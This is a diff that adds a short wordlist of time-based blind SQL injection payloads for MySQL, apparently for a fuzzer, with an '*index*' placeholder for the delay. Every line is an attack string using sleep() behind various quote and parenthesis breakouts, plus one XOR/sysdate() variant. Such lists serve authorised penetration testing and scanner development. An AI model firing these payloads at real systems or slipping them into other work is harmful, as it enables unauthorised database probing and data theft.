@@ -1,0 +1,13 @@
+'XOR(if(now()=sysdate(),sleep(*index*),0))OR'
+sleep(*index*)#
+1 or sleep(*index*)#
+" or sleep(*index*)#
+' or sleep(*index*)#
+" or sleep(*index*)="
+' or sleep(*index*)='
+1) or sleep(*index*)#
+") or sleep(*index*)="
+') or sleep(*index*)='
+1)) or sleep(*index*)#
+")) or sleep(*index*)="
+')) or sleep(*index*)='
